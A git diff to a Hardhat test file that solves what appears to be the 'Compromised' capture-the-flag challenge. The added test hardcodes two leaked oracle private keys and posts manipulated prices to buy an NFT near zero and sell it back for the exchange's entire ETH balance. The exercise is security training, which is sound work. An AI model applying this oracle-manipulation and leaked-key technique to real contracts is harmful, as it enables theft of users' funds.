@@ -1,4 +1,6 @@
 const { expect } = require('chai');
+const { Wallet, BigNumber } = require('ethers');
+const { parseEther } = require('ethers/lib/utils');
 const { ethers } = require('hardhat');
 
 describe('Compromised challenge', function () {
@@ -61,6 +63,32 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const privateKeys = [
+            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", 
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        ];
+        const knownOracles = [];
+        for (let priKey of privateKeys) {
+            let oracle = new Wallet(priKey, ethers.provider);
+            knownOracles.push(oracle);
+        }
+
+        for (let knownOracle of knownOracles) {
+            await this.oracle.connect(knownOracle).postPrice("DVNFT", 0);
+        }
+
+        await this.exchange.connect(attacker).buyOne({value : parseEther('0.01')});
+
+        for (let knownOracle of knownOracles) {
+            await this.oracle.connect(knownOracle).postPrice("DVNFT", BigNumber.from(EXCHANGE_INITIAL_ETH_BALANCE));
+        }
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        for (let knownOracle of knownOracles) {
+            await this.oracle.connect(knownOracle).postPrice("DVNFT", BigNumber.from(INITIAL_NFT_PRICE));
+        }
     });
 
     after(async function () {
